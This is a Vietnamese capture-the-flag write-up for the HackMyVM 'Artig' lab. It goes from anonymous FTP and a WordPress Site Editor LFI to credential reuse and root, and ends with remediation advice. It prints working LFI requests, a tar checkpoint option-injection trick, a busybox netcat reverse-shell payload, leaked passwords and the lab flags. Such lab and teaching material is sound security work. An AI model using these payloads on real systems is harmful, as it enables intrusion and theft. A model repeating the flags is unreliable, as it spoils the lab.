# HackMyVM — Artig

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy Artig (Target) | `10.0.2.6` |
| FTP | `21/tcp` |
| SSH | `22/tcp` |
| HTTP | `80/tcp` |
| Redis | `6379/tcp` |
| Web Server | Apache `2.4.66` |
| CMS | WordPress `6.9.4` |
| User | `max` |
| User flag | `HVM{XxWh4t-D1d-Y0u-Do-Max!!!xX}` |
| Root flag | `HVM{xXw1lDc4rd-f0r-7h3-w1nNXx}` |

> **Quy ước 2 terminal**
>
> - 🟦 **Terminal Kali**: scan, FTP, HTTP enumeration, tạo payload và listener.
> - 🟥 **Terminal Artig**: SSH, kiểm tra quyền và thực hiện các bước leo thang đặc quyền.
>
> Không chạy nhầm lệnh giữa hai máy.

---

# 1. Câu 1 — Khảo sát hệ thống

**Thực hiện quá trình trinh sát và quét máy chủ để xác định các cổng mạng đang mở, dịch vụ đang chạy trên các cổng đó và các thông tin liên quan có thể hỗ trợ quá trình đánh giá bảo mật.**

## 1.1. Xác định Target

### 🟦 Kali

Target của bài:

```text
10.0.2.6
```

Kiểm tra kết nối:

```bash
ping -c 4 10.0.2.6
```

---

## 1.2. Quét toàn bộ TCP

### 🟦 Kali

```bash
nmap -p- -Pn -T4 10.0.2.6
```

Các cổng quan trọng được xác định:

```text
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
```

Quét chi tiết service/version:

```bash
nmap -p- -sCV -Pn -T4 10.0.2.6
```

Kết quả đáng chú ý:

```text
21/tcp   FTP      vsftpd 3.0.5
22/tcp   SSH      OpenSSH 10.0p2 Debian
80/tcp   HTTP     Apache 2.4.66 (Debian)
6379/tcp Redis
```

---

## 1.3. Kiểm tra FTP Anonymous

### 🟦 Kali

```bash
ftp 10.0.2.6
```

Đăng nhập:

```text
Name: anonymous
Password: <Enter>
```

Kết quả:

```text
230 Login successful.
```

Liệt kê file:

```bash
ls -la
```

Có file:

```text
-rw-rw-r--    1 1000     1000          649 ... note.txt
```

Tải về:

```bash
get note.txt
bye
```

**Nội dung note.txt** chứa các manh mối:

- Có một số vấn đề liên quan đến các file cấu hình của core service.
- Hệ thống đang thử nghiệm một **Site Editor plugin**.
- SSH hiện bị giới hạn cho các tài khoản quản trị.

=> Hướng enumeration tiếp tục sang **Web / WordPress** và các service phía sau.

---

## 1.4. Kiểm tra HTTP

### 🟦 Kali

```bash
curl -I http://10.0.2.6
```

Kết quả:

```text
HTTP/1.1 200 OK
Server: Apache/2.4.66 (Debian)
Link: <http://artig.hvm/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8
```

Header `wp-json` cho thấy hệ thống đang chạy **WordPress**.

---

## 1.5. WordPress Enumeration bằng WPScan

### 🟦 Kali

```bash
wpscan --url http://10.0.2.6 --enumerate u,p
```

Các thông tin quan trọng:

```text
WordPress version: 6.9.4
Theme: twentytwentyfive
Theme version: 1.4
User: max
XML-RPC: enabled
Upload directory listing: enabled
WP-Cron: enabled
```

WPScan phát hiện user:

```text
[+] max
```

> WPScan được chạy không có API Token nên phần vulnerability database không được xuất ra. Việc xác định plugin **Site Editor** được thực hiện bằng cách kiểm tra trực tiếp đường dẫn plugin.

---

## 1.6. Xác định điểm vào

Từ kết quả scan:

```text
21     FTP (Anonymous)
22     SSH
80     HTTP / WordPress
6379   Redis
```

Các hướng cần kiểm tra:

```text
FTP Anonymous → note.txt → Site Editor
WordPress     → LFI qua Site Editor 1.1
Redis         → credential
SSH           → initial access
```

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

**Thực hiện khai thác các lỗ hổng hoặc cấu hình bảo mật yếu trên máy để đạt được quyền truy cập ban đầu, nâng cao đặc quyền và chứng minh mức độ kiểm soát hệ thống bằng cách tìm và thu thập `user.txt` và `root.txt`.**

## 2.1. Phát hiện Site Editor Plugin

### 🟦 Kali

```bash
curl -s http://10.0.2.6/wp-content/plugins/site-editor/readme.txt | head -50
```

Kết quả:

```text
Stable tag: 1.1
```

Plugin:

```text
Site Editor - WordPress Site Builder - Theme Builder and Page Builder
```

Theo hướng dẫn của bài lab, phiên bản **Site Editor 1.1** là điểm vào cho lỗi **Local File Inclusion (LFI)**.

---

## 2.2. Khai thác LFI

Endpoint dễ bị khai thác:

```text
/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php
```

Tham số:

```text
ajax_path
```

### 🟦 Kali — đọc `/etc/passwd`

```bash
curl -s "http://10.0.2.6/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"
```

Kết quả có các user:

```text
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
max:x:1000:1000:max,,,:/home/max:/bin/bash
redis:x:103:106::/var/lib/redis:/usr/sbin/nologin
mario:x:1001:1001:,,,:/home/mario:/bin/bash
```

=> Endpoint cho phép **đọc file cục bộ** trên máy đích.

Chuỗi tại thời điểm này:

```text
WordPress
   ↓
Site Editor 1.1
   ↓
LFI
   ↓
Đọc file hệ thống
```

---

## 2.3. Đọc Redis configuration qua LFI

### 🟦 Kali

```bash
curl -s "http://10.0.2.6/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf" | grep -Ei 'requirepass|masterauth|password|Mario'
```

Kết quả quan trọng:

```text
# Dear Mario, this is Max. The password you put here for the Redis server it's too weak and anyone can guess it. Please change it!

requirepass washington
```

Thu được credential:

```text
Redis password = washington
```

Đây là bước quan trọng vì mật khẩu này được **tái sử dụng** cho tài khoản `mario`.

---

## 2.4. Xác nhận Redis credential

### 🟦 Kali

```bash
redis-cli -h 10.0.2.6 -a 'washington' ping
```

Kết quả:

```text
PONG
```

Kiểm tra thông tin Redis:

```bash
redis-cli -h 10.0.2.6 -a 'washington' info server
```

Một số thông tin:

```text
redis_version:8.0.2
redis_mode:standalone
tcp_port:6379
config_file:/etc/redis/redis.conf
listener0:name=tcp,bind=0.0.0.0,port=6379
```

Kiểm tra key:

```bash
redis-cli -h 10.0.2.6 -a 'washington' --scan
```

Trong lần kiểm tra này không có key được trả về.

> Mục tiêu của bước Redis không phải lấy flag trực tiếp mà là **xác nhận credential** thu được từ LFI và kiểm tra khả năng tái sử dụng credential.

---

## 2.5. Dùng credential để truy cập FTP bằng user `mario`

### 🟦 Kali

```bash
ftp 10.0.2.6
```

Đăng nhập:

```text
Name: mario
Password: washington
```

Kết quả:

```text
230 Login successful.
```

Liệt kê thư mục:

```bash
ls -la
```

Có các file đáng chú ý:

```text
.bash_history
.bashrc
.profile
.ssh/
```

---

## 2.6. Đọc `.bash_history`

### 🟦 Kali

```bash
get .bash_history
bye
```

```bash
cat .bash_history
```

Nội dung cho thấy `mario` từng thao tác với:

```text
~/.ssh
ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
/var/www/html
```

Đặc biệt, history cho thấy tài khoản `mario` đã truy cập khu vực:

```text
/var/www/html
```

=> Tiếp tục kiểm tra WordPress document root qua FTP.

---

## 2.7. Tìm file backup của WordPress

### 🟦 Kali

```bash
ftp 10.0.2.6
```

```text
mario
washington
```

```bash
cd /var/www/html
ls -la
```

Có file bất thường:

```text
-rwxr-xr-x 1 1000 1000 3326 ... wp-configg.php.bak
```

Đây là bản backup của file cấu hình WordPress.

Tải file:

```bash
get wp-configg.php.bak
bye
```

```bash
cat wp-configg.php.bak
```

Thông tin database:

```text
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wpmaxadmin' );
define( 'DB_PASSWORD', 'm92f21W86rrq' );
define( 'DB_HOST', 'localhost' );
```

Credential quan trọng:

```text
DB_USER     = wpmaxadmin
DB_PASSWORD = m92f21W86rrq
```

Theo chuỗi khai thác của bài lab, password `m92f21W86rrq` được **tái sử dụng** cho tài khoản `max`.

---

## 2.8. SSH vào tài khoản `max`

### 🟦 Kali

```bash
ssh max@10.0.2.6
```

Password:

```text
m92f21W86rrq
```

Sau khi đăng nhập:

### 🟥 Artig

```bash
whoami
```

Kết quả:

```text
max
```

```bash
id
```

Kết quả:

```text
uid=1000(max) gid=1000(max) groups=1000(max),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev)
```

Như vậy đã có **initial shell** với user:

```text
max
```

---

## 2.9. Lấy user.txt

### 🟥 Artig

```bash
cat ~/user.txt
```

Kết quả:

```text
HVM{XxWh4t-D1d-Y0u-Do-Max!!!xX}
```

**User flag** đã được thu thập thành công.

---

## 2.10. Kiểm tra quyền sudo

### 🟥 Artig

```bash
sudo -l
```

Kết quả:

```text
User max may run the following commands on Artig:
    (www-data) NOPASSWD: /bin/bash
```

Điều này có nghĩa:

```text
max
 ↓
sudo -u www-data /bin/bash
 ↓
www-data
```

Không cần nhập password.

---

## 2.11. Chuyển sang `www-data`

### 🟥 Artig

```bash
sudo -u www-data /bin/bash
```

```bash
whoami
```

Kết quả:

```text
www-data
```

Đây là bước chuyển quyền từ:

```text
max → www-data
```

---

## 2.12. Kiểm tra `/opt/backup.sh`

### 🟥 Artig

```bash
ls -la /opt/
```

Có:

```text
-rwxr----- 1 root max 136 ... backup.sh
```

Đọc script:

```bash
cat /opt/backup.sh
```

Nội dung:

```bash
#!/bin/bash

BACKUP_DIR="/root"
TARGET="/var/www/html"

mkdir -p $BACKUP_DIR

cd $TARGET
tar -czf $BACKUP_DIR/wordpress_backup.tar.gz *
```

Điểm đáng chú ý:

```text
tar -czf /root/wordpress_backup.tar.gz *
```

Script sử dụng **wildcard `*`** trực tiếp trong lệnh `tar`.

Nếu các file có tên bắt đầu bằng `--` tồn tại trong `/var/www/html`, chúng có thể được shell mở rộng thành đối số và được `tar` diễn giải như **option**.

---

## 2.13. Kiểm tra tại sao không thể chạy backup trực tiếp bằng `max`

### 🟥 Artig

```bash
cd /var/www/html
tar -czf /root/wordpress_backup.tar.gz *
```

Kết quả:

```text
tar (child): /root/wordpress_backup.tar.gz: Cannot open: Permission denied
```

Lý do:

```text
max không có quyền ghi vào /root
```

=> Cần tìm cách đưa dữ liệu do `www-data` kiểm soát vào command line của `tar`, trong khi chính backup process được thực thi với quyền cao hơn.

---

## 2.14. Khai thác GNU tar checkpoint option injection

Kỹ thuật sử dụng ở đây là tạo các **filename đặc biệt** trong:

```text
/var/www/html
```

Hai filename được tạo:

```text
--checkpoint=1
--checkpoint-action=exec=sh a
```

Khi lệnh:

```bash
tar -czf /root/wordpress_backup.tar.gz *
```

được thực thi, các filename này có thể được `tar` hiểu như option.

Cụ thể:

- `--checkpoint=1` → bật checkpoint
- `--checkpoint-action=exec=sh a` → yêu cầu `tar` thực thi `sh a`

Script `a` sẽ tạo kết nối ngược về Kali.

---

## 2.15. Tạo payload

### 🟥 Artig — www-data

```bash
sudo -u www-data /bin/bash
cd /var/www/html
```

Tạo payload:

```bash
echo "busybox nc 10.0.2.15 5555 -e /bin/sh" > a
```

Tạo filename checkpoint:

```bash
touch ./--checkpoint=1
```

Tạo filename checkpoint-action:

```bash
touch './--checkpoint-action=exec=sh a'
```

Kiểm tra:

```bash
ls -la -- --checkpoint*
```

Kết quả:

```text
-rw-rw-r-- 1 www-data www-data 0 ... '--checkpoint=1'
-rw-rw-r-- 1 www-data www-data 0 ... '--checkpoint-action=exec=sh a'
```

Kiểm tra payload:

```bash
cat a
```

Nội dung:

```text
busybox nc 10.0.2.15 5555 -e /bin/sh
```

---

## 2.16. Mở listener trên Kali

### 🟦 Kali

```bash
nc -lvnp 5555
```

Kết quả ban đầu:

```text
listening on [any] 5555 ...
```

Sau khi backup process thực thi lệnh `tar`, payload được kích hoạt và kết nối về Kali:

```text
connect to [10.0.2.15] from (UNKNOWN) [10.0.2.6] 35124
```

> Trong kết quả thực hành được ghi nhận, thời điểm kích hoạt cụ thể của backup job không được ghi lại bằng một lệnh scheduler riêng. Vì vậy chỉ kết luận rằng quá trình backup đã thực thi payload; không gán cụ thể cho cron/systemd nếu chưa quan sát được cấu hình tương ứng.

---

## 2.17. Xác nhận quyền root

### 🟦 Kali — reverse shell

```bash
whoami
```

Kết quả:

```text
root
```

```bash
id
```

Kết quả:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Như vậy chuỗi leo thang đặc quyền đã hoàn tất:

```text
LFI
 ↓
Redis password
 ↓
FTP mario
 ↓
wp-config backup
 ↓
SSH max
 ↓
sudo → www-data
 ↓
tar option injection
 ↓
reverse shell
 ↓
root
```

---

## 2.18. Lấy root.txt

### 🟦 Kali — reverse shell

```bash
cat /root/root.txt
```

Kết quả:

```text
HVM{xXw1lDc4rd-f0r-7h3-w1nNXx}
```

**Root flag** đã được thu thập thành công.

---

## 2.19. Chuỗi khai thác hoàn chỉnh

```text
┌──────────────────────────────┐
│ 🟦 KALI                      │
│ 10.0.2.15                    │
└──────────────┬───────────────┘
               │
               │ Anonymous FTP
               ▼
┌──────────────────────────────┐
│ note.txt                     │
│ → Site Editor plugin         │
└──────────────┬───────────────┘
               │
               │ HTTP / WordPress
               ▼
┌──────────────────────────────┐
│ Site Editor 1.1              │
│ → LFI                        │
└──────────────┬───────────────┘
               │
               │ đọc /etc/redis/redis.conf
               ▼
┌──────────────────────────────┐
│ Redis password               │
│ washington                   │
└──────────────┬───────────────┘
               │
               │ password reuse
               ▼
┌──────────────────────────────┐
│ FTP mario                    │
│ → .bash_history              │
│ → /var/www/html              │
└──────────────┬───────────────┘
               │
               │ download backup
               ▼
┌──────────────────────────────┐
│ wp-configg.php.bak           │
│ → m92f21W86rrq               │
└──────────────┬───────────────┘
               │
               │ SSH
               ▼
┌──────────────────────────────┐
│ max                          │
│ → user.txt                   │
└──────────────┬───────────────┘
               │
               │ sudo -u www-data /bin/bash
               ▼
┌──────────────────────────────┐
│ www-data                     │
│ → kiểm soát /var/www/html    │
└──────────────┬───────────────┘
               │
               │ tar * option injection
               ▼
┌──────────────────────────────┐
│ backup process               │
│ → checkpoint action          │
│ → reverse shell              │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│ root                         │
│ → root.txt                   │
└──────────────────────────────┘
```

---

## 2.20. Hai terminal — thứ tự thực hiện

## 🟦 TERMINAL KALI

```bash
# 1. Recon
nmap -p- -Pn -T4 10.0.2.6
nmap -p- -sCV -Pn -T4 10.0.2.6

# 2. Anonymous FTP
ftp 10.0.2.6
# anonymous + Enter
ls -la
get note.txt
bye

# 3. HTTP
curl -I http://10.0.2.6

# 4. WordPress
wpscan --url http://10.0.2.6 --enumerate u,p

# 5. Kiểm tra Site Editor
curl -s http://10.0.2.6/wp-content/plugins/site-editor/readme.txt | head -50

# 6. LFI
curl -s "http://10.0.2.6/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd"

# 7. Redis config
curl -s "http://10.0.2.6/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/redis/redis.conf" | grep -Ei 'requirepass|masterauth|password|Mario'

# 8. Xác nhận Redis
redis-cli -h 10.0.2.6 -a 'washington' ping

# 9. FTP mario
ftp 10.0.2.6
# mario / washington
get .bash_history
cd /var/www/html
get wp-configg.php.bak
bye

# 10. SSH max
ssh max@10.0.2.6
# Password: m92f21W86rrq

# 11. Sau khi tạo payload trên Artig, mở listener
nc -lvnp 5555
```

## 🟥 TERMINAL ARTIG

Sau khi SSH:

```bash
whoami
id
cat ~/user.txt
sudo -l
```

Chuyển sang `www-data` và tạo payload:

```bash
sudo -u www-data /bin/bash
cd /var/www/html

echo "busybox nc 10.0.2.15 5555 -e /bin/sh" > a
touch ./--checkpoint=1
touch './--checkpoint-action=exec=sh a'
ls -la -- --checkpoint*
```

Sau đó chờ backup process thực thi payload.

---

# 3. Câu 3 — Đề xuất biện pháp khắc phục

**Phân tích nguyên nhân dẫn đến khả năng khai thác hệ thống và đề xuất các biện pháp khắc phục nhằm ngăn chặn việc truy cập trái phép, leo thang đặc quyền và bảo vệ các tài nguyên quan trọng của hệ thống.**

## 3.1. Nguyên nhân chính

Chuỗi khai thác của Artig dựa trên nhiều điểm yếu kết hợp:

### 1. FTP Anonymous được bật

FTP cho phép đăng nhập `anonymous` mà không cần tài khoản thực → lộ `note.txt`.

**Khắc phục:**

- Tắt Anonymous FTP nếu không cần.
- Nếu bắt buộc dùng FTP, giới hạn quyền và thư mục truy cập.
- Ưu tiên SFTP/SSH cho việc truyền file.

### 2. WordPress Site Editor 1.1 có LFI

Endpoint:

```text
/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php
```

cho phép đọc file cục bộ thông qua tham số `ajax_path` → đọc được `/etc/passwd` và `/etc/redis/redis.conf`.

**Khắc phục:**

- Xóa hoặc cập nhật plugin dễ bị lỗi.
- Không cho phép user-controlled path được đưa trực tiếp vào hàm đọc file.
- Sử dụng allowlist cho các file/path hợp lệ.
- Kiểm tra và chuẩn hóa path trước khi truy cập.
- Chặn truy cập trực tiếp đến các file cấu hình nhạy cảm.

### 3. Redis sử dụng password yếu

File cấu hình chứa:

```text
requirepass washington
```

Ngoài việc password yếu, credential còn được tái sử dụng cho tài khoản `mario`.

**Khắc phục:**

- Sử dụng secret ngẫu nhiên, đủ dài.
- Không reuse password giữa service và user account.
- Dùng ACL của Redis khi phù hợp.
- Không bind Redis ra toàn bộ interface nếu không cần.
- Firewall Redis chỉ cho phép các máy/service cần thiết truy cập.

### 4. Password reuse

- Credential `washington` dùng cho Redis và `mario` FTP.
- Credential `m92f21W86rrq` xuất hiện trong `wp-configg.php.bak` và được reuse để SSH vào `max`.

**Khắc phục:**

- Mỗi service/user phải có credential riêng.
- Sử dụng password manager hoặc secret manager.
- Không lưu credential trong backup file không cần thiết.
- Rotate credential khi phát hiện bị lộ.

### 5. Backup file chứa database password

File `wp-configg.php.bak` được đặt trong Web root và có thể truy cập thông qua FTP, chứa `DB_USER` / `DB_PASSWORD`.

**Khắc phục:**

- Không lưu backup/config file trong Web root.
- Xóa file backup không cần thiết.
- Giới hạn permission.
- Đưa secret ra khỏi source/config công khai khi kiến trúc cho phép.
- Rotate database password sau khi credential bị lộ.

### 6. sudo cho phép `max` chạy Bash dưới `www-data`

Cấu hình:

```text
(www-data) NOPASSWD: /bin/bash
```

cho phép `sudo -u www-data /bin/bash`.

**Khắc phục:**

- Không cấp quyền chạy shell tổng quát bằng sudo.
- Chỉ whitelist đúng command cần thiết.
- Tránh NOPASSWD nếu không thực sự cần.
- Áp dụng nguyên tắc Least Privilege.

### 7. Backup script dùng wildcard không an toàn

Script:

```bash
tar -czf /root/wordpress_backup.tar.gz *
```

sử dụng wildcard trong thư mục mà user dịch vụ có thể ghi → tạo điều kiện cho **tar option injection** thông qua filename bắt đầu bằng `--`.

**Khắc phục:**

- Dùng `tar -czf /root/wordpress_backup.tar.gz -- *` để tránh filename bị hiểu như option.
- Thiết kế quy trình backup sao cho source directory không thể bị tài khoản không tin cậy sửa đổi.
- Backup process nên chạy với quyền tối thiểu cần thiết.
- Không để user Web ghi vào thư mục được root backup trực tiếp.
- Kiểm tra filename trước khi đưa vào command.

### 8. Reverse shell có thể kết nối ra ngoài

Payload:

```text
busybox nc 10.0.2.15 5555 -e /bin/sh
```

cho thấy server có khả năng tạo outbound connection tới Kali.

**Khắc phục:**

- Áp dụng egress filtering.
- Chỉ cho phép outbound traffic cần thiết.
- Giám sát kết nối bất thường.
- Alert khi process Web/backup tạo kết nối mạng mới.

---

## 3.2. Ma trận nguyên nhân và biện pháp khắc phục

| Điểm yếu | Bằng chứng trong lab | Biện pháp |
|---|---|---|
| Anonymous FTP | `230 Login successful` với anonymous | Tắt Anonymous FTP |
| LFI | Đọc được `/etc/passwd` | Patch/remove plugin, allowlist path |
| Redis password yếu | `requirepass washington` | Secret mạnh + ACL |
| Password reuse | `washington` dùng cho Redis/mario | Credential riêng |
| Backup config lộ DB password | `wp-configg.php.bak` | Xóa backup khỏi Web root |
| Password reuse tiếp | DB password dùng cho max | Không reuse |
| Sudo shell | `(www-data) NOPASSWD: /bin/bash` | Least Privilege |
| Tar wildcard injection | `tar ... *` | Dùng `--` + kiểm soát directory |
| Outbound reverse shell | Kết nối tới `10.0.2.15:5555` | Egress filtering + monitoring |

---

# Kết luận ngắn gọn

## Câu 1

Đã xác định Target:

```text
10.0.2.6
```

Các service quan trọng:

```text
21/tcp   FTP (vsftpd 3.0.5) — Anonymous
22/tcp   SSH (OpenSSH 10.0p2)
80/tcp   HTTP (Apache 2.4.66) — WordPress 6.9.4
6379/tcp Redis
```

## Câu 2

Chuỗi khai thác:

```text
Anonymous FTP → note.txt
      ↓
Site Editor 1.1 LFI
      ↓
Redis password (washington)
      ↓
FTP mario → wp-configg.php.bak
      ↓
SSH max (m92f21W86rrq)
      ↓
sudo → www-data
      ↓
tar option injection → reverse shell root
```

User flag:

```text
HVM{XxWh4t-D1d-Y0u-Do-Max!!!xX}
```

Root flag:

```text
HVM{xXw1lDc4rd-f0r-7h3-w1nNXx}
```

## Câu 3

Khắc phục trọng tâm:

```text
Tắt Anonymous FTP
            +
Patch/remove plugin LFI
            +
Secret mạnh + không reuse password
            +
Không để backup/config trong Web root
            +
Least Privilege (sudo)
            +
Tar an toàn (dùng --)
            +
Egress filtering + Monitoring
```
